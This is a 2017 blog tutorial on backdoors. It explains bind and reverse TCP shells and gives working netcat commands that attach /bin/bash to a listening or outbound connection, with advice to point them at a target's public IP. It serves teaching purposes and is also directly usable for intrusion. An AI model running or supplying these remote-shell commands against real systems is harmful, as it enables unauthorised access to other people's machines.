---
Comprehensive Guide to Backdoors
---
<article class="post-listing post-17689 post type-post status-publish format-standard has-post-thumbnail hentry  tag-backdoors tag-comprehensive tag-guide">
    <div class="post-inner">
        <span>Posted by: <a href="https://www.deepdotweb.com/author/filipjelic/" title="">Filip Jelic </a></span>
    <span>January 25, 2017</span>
    
    <span><a href="https://www.deepdotweb.com/2017/01/25/comprehensive-guide-backdoors/#respond">Leave a comment</a></span>
    </p>
    <div class="clear"></div>
    <div class="entry">
    <p>When I was learning this, I was disappointed with internet guides for setting up remote access, aka backdoor to a computer so here&#8217;s my contribution. Also, it&#8217;s important for security and privacy concerned people to understand this because these methods are often used maliciously to gain control over target computer.</p>
    <p>In this article, I&#8217;m going to cover theory and practice behind binding TCP shells and reverse TCP shells. After that I will briefly touch upon their advanced versions &#8211; secure shells (SSH) and reverse secure shells.</p>
    <p><strong>Theory</strong></p>
    <p>Transmission Control Protocol (TCP) is a way to transfer data from one IP address to another. It&#8217;s used to transfer the command to the remote computer as well as the command output back to the command and control computer. In TCP connections, one side has to <strong>listen</strong> for a connection and the other side has to <strong>connect.</strong></p>
    <p>There are 2 ways to get a shell on remote machine:</p>
    <ol>
    <li><strong>Remote machine listens for a connection.</strong> There has to be a process on the remote machine that waits for a connection and executes a shell once the connection is established.</li>
    <li><strong>Remote machine connects to us.</strong> This one goes the other way around – local command and control machine has to listen for a connection and remote machine has to &#8216;send&#8217; a shell to the listener.</li>
    </ol>
    <p><img class="wp-image-17738 aligncenter" src="/imgs/2017/01/word-image-125.png" srcset="/imgs/2017/01/word-image-125.png 1000w, /imgs/2017/01/word-image-125-300x180.png 300w" sizes="(max-width: 1000px) 100vw, 1000px"/></p>
    <p>Which one is better? Of course, it depends on the circumstances, otherwise one wouldn&#8217;t be mentioned. Each paragraph explains corresponding row in the table below.</p>
    <p>At a first glance, option #1 seems superior because we can connect to remote computer anytime, instantly. When using reverse shell, persistent backdoors try to connect to the control computer periodically, so we usually have to wait.</p>
    <p>By default, firewall blocks all connections to the machine. To allow connections to the listener process, firewall must open that port. Firewall only works for incoming connection, it has no restrictions on outgoing connections so by choosing option #1 or option #2, you&#8217;re also choosing which computer&#8217;s firewall you need to configure. This is why hackers prefer reverse shells – it&#8217;s easier to configure their than victim&#8217;s firewall.</p>
    <p>When using TCP connection, each side&#8217;s router assigns a unique port to a specific computer in local area network. That&#8217;s how the router knows which packet should be sent to what computer in LAN. If we try to connect to our listener on remote machine (option #1) without configuring the router to forward our connection to the exact computer and exact process, the router will refuse connection because it doesn&#8217;t know where to send the packet. By choosing option #1 or option #2, you&#8217;re also choosing which router needs to be configured to port forward the connection. Obviously, hackers prefer to configure their router, rather than their victim&#8217;s.</p>
    <p>Hopefully, you can answer the question yourself after reading this. Here&#8217;s the summary:</p>
    <table>
    <tbody>
    <tr>
    <td></td>
    <td>Option #1 – Bind TCP shell to a port</td>
    <td>Option #2 – Reverse TCP shell</td>
    </tr>
    <tr>
    <td>Instant Connection</td>
    <td>YES</td>
    <td>NO</td>
    </tr>
    <tr>
    <td>Firewall</td>
    <td>Must be configured or turned off on remote machine</td>
    <td>Must be configured or turned off on control machine</td>
    </tr>
    <tr>
    <td>Port Forwarding</td>
    <td>Must be configured on remote machine&#8217;s router</td>
    <td>Must be configured on local machine&#8217;s router</td>
    </tr>
    </tbody>
    </table>
    <p>If you don&#8217;t know where is your computer going to be, reverse shell is the way to go because you can always configure the firewall and port forwarding on your location. If you can configure the firewall and port forwarding on the remote side beforehand, you might want to enjoy the instant access.</p>
    <p><strong>Hands-on guide</strong></p>
    <p>I&#8217;m going to use <a href="https://linux.die.net/man/1/nc">netcat</a> for demonstration because it&#8217;s available for Linux (featured here), Windows and Mac computers. It&#8217;s also the most simple and straightforward way to go. If you need to execute either of these without netcat, you can use Metasploit to generate a program for desired system.</p>
    <p><strong>Option #1 – Normal Shell</strong></p>
    <p>We need to bind a shell to a port and wait for a connection. Executing this on remote machine will do it:</p>
    <div id="crayon-59635cb24f19c760995041" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    nc -l -p 4444 -e /bin/bash
    
    -l listen for a connection
    
    -p specifies a port to listen on
    
    -e run this upon connection
    
    -k listen again after the connection is closed
    
    -v produce verbose output – use this to debug</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f19c760995041-2">2</div><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f19c760995041-4">4</div><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f19c760995041-6">6</div><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f19c760995041-8">8</div><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f19c760995041-10">10</div><div class="crayon-num" data-line="crayon-59635cb24f19c760995041-11">11</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59635cb24f19c760995041-1"><span class="crayon-v">nc</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">4444</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">e</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f19c760995041-2">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f19c760995041-3"><span class="crayon-o">-</span><span class="crayon-i">l</span><span class="crayon-h"> </span><span class="crayon-e">listen </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">connection</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f19c760995041-4">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f19c760995041-5"><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-i">specifies</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">port </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">listen </span><span class="crayon-v">on</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f19c760995041-6">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f19c760995041-7"><span class="crayon-o">-</span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-e">run </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-e">upon </span><span class="crayon-v">connection</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f19c760995041-8">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f19c760995041-9"><span class="crayon-o">-</span><span class="crayon-i">k</span><span class="crayon-h"> </span><span class="crayon-e">listen </span><span class="crayon-e">again </span><span class="crayon-e">after </span><span class="crayon-e">the </span><span class="crayon-e">connection </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-v">closed</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f19c760995041-10">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f19c760995041-11"><span class="crayon-o">-</span><span class="crayon-i">v</span><span class="crayon-h"> </span><span class="crayon-e">produce </span><span class="crayon-e">verbose </span><span class="crayon-i">output</span><span class="crayon-h"> </span>–<span class="crayon-h"> </span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">debug</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    &nbsp;</p>
    <p><img class="wp-image-17739" src="/imgs/2017/01/word-image-126.png" srcset="/imgs/2017/01/word-image-126.png 517w, /imgs/2017/01/word-image-126-300x48.png 300w" sizes="(max-width: 517px) 100vw, 517px"/></p>
    <p>Now, we need to connect to that listener from out local machine. I&#8217;m connecting to my own computer for the demo purposes so I use 127.0.0.1 as IP address. You should replace it with target&#8217;s <a href="http://whatismyip.com">public IP address</a>.</p>
    <div id="crayon-59635cb24f1ab363448543" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    nc 127.0.0.1 4444</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59635cb24f1ab363448543-1">1</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59635cb24f1ab363448543-1"><span class="crayon-i">nc</span><span class="crayon-h"> </span><span class="crayon-cn">127.0.0.1</span><span class="crayon-h"> </span><span class="crayon-cn">4444</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    &nbsp;</p>
    <p><img class="wp-image-17740" src="/imgs/2017/01/word-image-127.png" srcset="/imgs/2017/01/word-image-127.png 554w, /imgs/2017/01/word-image-127-300x96.png 300w" sizes="(max-width: 554px) 100vw, 554px"/></p>
    <p><strong>Option #2 – Reverse Shell</strong></p>
    <p>As previously discussed, we need to listen for a connection on our local, command and control computer:</p>
    <div id="crayon-59635cb24f1b2227974609" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    nc –l –p 4444</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59635cb24f1b2227974609-1">1</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59635cb24f1b2227974609-1"><span class="crayon-i">nc</span><span class="crayon-h"> </span>–<span class="crayon-i">l</span><span class="crayon-h"> </span>–<span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">4444</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    &nbsp;</p>
    <p><img class="wp-image-17741 aligncenter" src="/imgs/2017/01/word-image-128.png" srcset="/imgs/2017/01/word-image-128.png 569w, /imgs/2017/01/word-image-128-300x73.png 300w" sizes="(max-width: 569px) 100vw, 569px"/></p>
    <p>Now, the remote computer has to send a shell by executing this (replace 127.0.0.1 with public IP that belongs to your command and control computer):</p>
    <div id="crayon-59635cb24f1b9189440505" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    nc 127.0.0.1 4444 –c /bin/bash
    
    -c specifies a program to start upon connecting</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59635cb24f1b9189440505-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59635cb24f1b9189440505-2">2</div><div class="crayon-num" data-line="crayon-59635cb24f1b9189440505-3">3</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59635cb24f1b9189440505-1"><span class="crayon-i">nc</span><span class="crayon-h"> </span><span class="crayon-cn">127.0.0.1</span><span class="crayon-h"> </span><span class="crayon-cn">4444</span><span class="crayon-h"> </span>–<span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-59635cb24f1b9189440505-2">&nbsp;</div><div class="crayon-line" id="crayon-59635cb24f1b9189440505-3"><span class="crayon-o">-</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-i">specifies</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">program </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">start </span><span class="crayon-e">upon </span><span class="crayon-v">connecting</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    &nbsp;</p>
    <p><img class="wp-image-17742 aligncenter" src="/imgs/2017/01/word-image-129.png" srcset="/imgs/2017/01/word-image-129.png 413w, /imgs/2017/01/word-image-129-300x56.png 300w" sizes="(max-width: 413px) 100vw, 413px"/></p>
    <p>&#8230;result:</p>
    <p><img class="wp-image-17743 aligncenter" src="/imgs/2017/01/word-image-130.png" srcset="/imgs/2017/01/word-image-130.png 384w, /imgs/2017/01/word-image-130-300x105.png 300w" sizes="(max-width: 384px) 100vw, 384px"/></p>
    <p><strong>Endnote</strong></p>
    <p>Keep in mind that these backdoors&#8217; connection is in plain text and without any authentication. That&#8217;s why there are secure shell (SSH) and reverse secure shell that works the same way, but using encryption and password authentication with it.</p>
    </div>
    <span style="display:none"><a href="https://www.deepdotweb.com/tag/backdoors/" rel="tag">backdoors</a> <a href="https://www.deepdotweb.com/tag/comprehensive/" rel="tag">comprehensive</a> <a href="https://www.deepdotweb.com/tag/guide/" rel="tag">guide</a></span> <span style="display:none" class="updated">2017-01-25</span>
    <div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="https://www.deepdotweb.com/author/filipjelic/" title="Posts by Filip Jelic" rel="author">Filip Jelic</a></strong></div>
    </div>
</article>

